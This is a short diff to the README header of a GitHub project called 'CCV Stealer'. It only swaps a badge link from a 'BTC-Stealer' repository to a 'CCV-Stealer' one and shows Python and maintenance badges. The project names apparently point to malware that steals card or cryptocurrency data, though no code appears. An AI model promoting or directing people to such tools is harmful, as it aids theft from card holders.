@@ -1,6 +1,6 @@
 # CCV Stealer
 <p align="center">
-  <a href="https://github.com/Callumgm/BTC-Stealer/graphs/commit-activity">
+  <a href="https://github.com/Callumgm/CCV-Stealer/graphs/commit-activity">
     <img src="https://img.shields.io/badge/maintained-very little-critical?style=flat-square" alt="Maintained Very Little" />
   </a>
   <img src="https://img.shields.io/badge/python-3.9.7-blue?style=flat-square" alt="Python 3.9.7" />
